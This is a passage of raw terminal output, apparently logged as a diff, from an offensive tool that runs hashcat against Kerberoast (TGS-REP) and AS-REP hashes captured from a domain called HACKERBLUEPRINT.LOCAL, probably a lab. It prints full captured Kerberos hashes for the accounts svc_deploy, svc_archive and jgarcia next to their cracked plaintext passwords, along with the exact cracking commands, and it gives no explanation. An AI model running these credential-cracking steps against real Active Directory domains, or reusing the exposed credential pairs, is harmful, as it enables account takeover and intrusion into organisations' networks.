782403350f5b38fa1c3ccb57237fedd789b32072f3fb84c7f0135c32aa89364df3ab24b552c7703d9a8098cb69b3848ebd3bee58287128cdb907c12eb62985f706321fc6b04683bf64faf5479f46b0686098b5f1fa987195ac26a7e4b70679e2c20656e2e5245089430342221b0ec4c4deeed4b6a4:football
+$krb5tgs$23$*svc_deploy$HACKERBLUEPRINT.LOCAL$hackerblueprint.local/svc_deploy*$8d11ff37dbe879ff31056324dc229d46$a66b53d90588ef377986050d24d95f6efc80788813638065d329ded95b5f2fbaf87d6c8bff3b62bda780a4da7b350767d04df9602f6b89f846e0d8cd2b50e439eb06b0d37b9451ec024cdbe0dc5f2f3502668e7ce34753b744bb0c7763307386b2e8156a038016524c1e8b2645027f193245fa931f412d494c20fb9c0f0ae50948cc6bef09169a3c1fd927ef7e04b753985377b3cc54c2a01473928d043c963eb4421211abaf171988551b4a9e2576d51dab3c9959cabdd62051e15330c20e389fca5010d6802bf54fbe7bdc21483f6f32364866dceb5b4d576356d2a6df749b6e1f187f8246f1296f2faf3de4d204dd397242c10be10957c940780eaf92da0f6c45fddee35dc374fc13c7c05dc4aea9774560ceb150383f41b06a945525051b6cc0ca99ba3d7951c79699aae340cdb51065ef434bb93557314769de53d6968da95d0bfaff3148006255c08964bd8a443897cfa05d50f49531a1711d7d73c21b63fc01c003cc48df6ff284ee18c353f30b99cd3599771df8899f2e42edee6c153816ae93c7e46d6641e8341faf9ec1aa9fc55c4962fa82c2b6bd0552d9027dbe5b38df09391a6f19ba0a5fd102e1b12169c5fcf5ede20d1399b14ca1823309fb09199d017e3107b9c2160b02dfbd613eeeae1ce51a39c58dfc4a991151ec16d252763c97f419e02a259062099277d3868a3cc4582db13213edc723dbc808a991b8f46147631e43909ffebb97455c16a6dafc4cb48e8bc077281720e219c4453af09ba1183541ea6063456a61a6e56269780f4abaf86af5695d7327774e643baebb28f20d364d9f525d77d1160ecfd66d506845ddc0a77441b6548546c9487df02e53ba226f4d428db30a9db49fb9c6aa8f89c2cdaf2977e24ea9c3d343dd2a309f3882c956bc642fe0656f7f360f2f02d90f72437e859cf6be66c8db76daee8428aadc61a36e3a193ff9ca354d7ad498687e05079e6a17fef69d39fd56251b6df07c925a40960d02c81e6197d7829f778bf93b4ca15b4ceb78ca5fd923581a53e95cdf79d504ecaacc16185bb495fad87a3bc6f63012305cf5003d17054568eb68a7a6e3f9b0a7d53a2c28f3f3b098b372888937fe40c150f570c709164ee7e9339eb9f239e89cc57b7408c829eb2436b83094de92ae973e40ab3d4727e9bf6d3af94004f25e3c4e227f8e3fb4fca18a428ae7d3486aca1507b0fb9e800ec522a7c4878fef959c5a478e8c6c3f517afd0d447b65beae0926199c30ec91ec4ad61057cb2875395c51297176037376165ab0d275739b28577b8f7d99724f83b4a87fb3bfbf59587a9c9394412ce9f6a90da328aee1b7ac79b529b4185d772d4a726c84dd5c3daabede0fd826a8702bbcfe109e76c2fc7d3e41c547e36b19e659e432287c508b099fc9636a4425832300b625f233fc4dd7f6d8796ae88b7db8c3a04c656892942975e5470c78fa53c031769792579aec7be8c1d4070207c64e70c4e0fb53d03c:140190-KS
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: /tmp/kerberoast.txt
+Time.Started.....: Tue Jun  9 11:01:29 2026, (4 secs)
+Time.Estimated...: Tue Jun  9 11:01:33 2026, (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  3084.5 kH/s (2.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
+Progress.........: 26542080/28688770 (92.52%)
+Rejected.........: 0/26542080 (0.00%)
+Restore.Point....: 13254656/14344385 (92.40%)
+Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: 14129530 -> 137951230
+Hardware.Mon.#01.: Util: 33%
+
+Started: Tue Jun  9 11:01:28 2026
+Stopped: Tue Jun  9 11:01:35 2026
+
+  Running: Kerberoast hashes found (2)
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
+  └──────────────────────────────────────────────────
+  [+] 4 hash(es) captured — crack with hashcat?
+  [Y/n]: hashcat (v7.1.2) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+Initializing bridges. Please be patient...Initialized bridgesInitializing backend runtimes. Please be patient...Initialized backend runtimesInitializing backend devices. Please be patient...Initialized backend devicesOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 5800X 8-Core Processor, 5002/10005 MB (2048 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Counting lines in /tmp/kerberoast.txt. Please be patient...Counted lines in /tmp/kerberoast.txtParsing Hashes: 1/2 (50.00%)...Parsed Hashes: 2/2 (100.00%)Sorting hashes. Please be patient...Sorted hashesRemoving duplicate hashes. Please be patient...Removed duplicate hashesSorting salts. Please be patient...Sorted saltsComparing hashes with potfile entries. Please be patient...Compared hashes with potfile entriesINFO: All hashes found as potfile and/or empty entries! Use --show to display them.
+      For more information, see https://hashcat.net/faq/potfile
+
+Started: Tue Jun  9 11:02:31 2026
+Stopped: Tue Jun  9 11:02:31 2026
+hashcat (v7.1.2) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+Initializing bridges. Please be patient...Initialized bridgesInitializing backend runtimes. Please be patient...Initialized backend runtimesInitializing backend devices. Please be patient...Initialized backend devicesOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 5800X 8-Core Processor, 5002/10005 MB (2048 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Counting lines in /tmp/asrep.txt. Please be patient...Counted lines in /tmp/asrep.txtParsing Hashes: 1/2 (50.00%)...Parsed Hashes: 2/2 (100.00%)Sorting hashes. Please be patient...Sorted hashesRemoving duplicate hashes. Please be patient...Removed duplicate hashesSorting salts. Please be patient...Sorted saltsComparing hashes with potfile entries. Please be patient...Compared hashes with potfile entriesGenerating bitmap tables...Generated bitmap tablesHashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing bridge salts. Please be patient...Initialized bridge saltsInitializing device kernels and memory. Please be patient...Initializing backend runtime for device #1. Please be patient...Initialized backend runtime for device #1Host memory allocated for this attack: 516 MB (4057 MB free)
+
+Initialized device kernels and memoryStarting self-test. Please be patient...Finished self-testDictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$svc_archive@HACKERBLUEPRINT.LOCAL:6c16c50f7b298b11404074a6c6767bd9$5be120140e2421ba8bbe54197116f9740a9e58de2755b5ddb48993534f1db13f37457dbf09c412b59dc67b5910c32771ab987ea5e1038570da70eaa4bbd487403e74e0408173ff46e0c3469d106ab074d6d8f967667cb29ff598fd86ffe72cc20f3302894027bb45850d44f8eaf8ccc8ad2580306e85e65b567f59bf1a15e48fe9c4b9a6d17d10882ea78e7a9fe4ada36daf4dbc026d7d9d6a7046d73612dba716c72be2c2229970dce7842a20fac8489f33749b3878c33aaba3374d9415b8639451c69e8c466168fc09e2abff36764ddf7a62b9c4a7a908899f82aba2b5607192a95ae3f15bcd7c67868d9e43ede875190970f2ece1749c4e44174c1dfc:football
+$krb5asrep$23$jgarcia@HACKERBLUEPRINT.LOCAL:b7b8dd1b03cefe9c3d65321ec5c5f253$17498bd9111e3a754c6218db8559960eb0f4c54c2a1e64bc088ca71999cc62e4af6a7fee5c5132147f8b30ba2ef28bb9d181d0bc91fa56bdd7be06d62ad200b238be3c1e1980023c08c05dfbf94b6c95275b9265c17e7ba6998994ee46e8e7467d0abee2e98c84d03f6e73afe84428031c8371a5b40507ce02a68ffe1d84f6da622dcdb820b9178a0bce82dc4a9890f30e11a62673ef8cac9523d9cf52aae478f1378e513691c3141248750993b54184fd00d97d71d45644d06df1382af5cf8095e3b60aacc09150ddb71a7c0716956f0cba1602755e251a5e9422971999849567888b1c205cc4761729f0f3a2eacc265903c71ca193c3f508bb3a23ec28:Password1
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: /tmp/asrep.txt
+Time.Started.....: Tue Jun  9 11:02:32 2026, (0 secs)
+Time.Estimated...: Tue Jun  9 11:02:32 2026, (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  3557.6 kH/s (1.94ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
+Progress.........: 32768/28688770 (0.11%)
+Rejected.........: 0/32768 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: 123456 -> cocoliso
+Hardware.Mon.#01.: Util:  7%
+
+Started: Tue Jun  9 11:02:31 2026
+Stopped: Tue Jun  9 11:02:34 2026
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
+  └──────────────────────────────────────────────────
+  [+] Step completed
+
+  Running: AS-REP hashes found (2)
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt --force
+  └──────────────────────────────────────────────────
+  [+] 4 hash(es) captured — crack with hashcat?
+  [Y/n]: hashcat (v7.1.2) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+Initializing bridges. Please be patient...Initialized bridgesInitializing backend runtimes. Please be patient...Initialized backend runtimesInitializing backend devices. Please be patient...Initialized backend devicesOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 5800X 8-Core Processor, 5002/10005 MB (2048 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Counting lines in /tmp/kerberoast.txt. Please be patient...Counted lines in /tmp/kerberoast.txtParsing Hashes: 1/2 (50.00%)...Parsed Hashes: 2/2 (100.00%)Sorting hashes. Please be patient...Sorted hashesRemoving duplicate hashes. Please be patient...Removed duplicate hashesSorting salts. Please be patient...Sorted saltsComparing hashes with potfile entries. Please be patient...Compared hashes with potfile entriesINFO: All hashes found as potfile and/or empty entries! Use --show to display them.
+      For more information, see https://hashcat.net/faq/potfile
+
+Started: Tue Jun  9 11:02:36 2026
+Stopped: Tue Jun  9 11:02:36 2026
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
+  └──────────────────────────────────────────────────
+  [+] Step completed
+  [Enter] to return
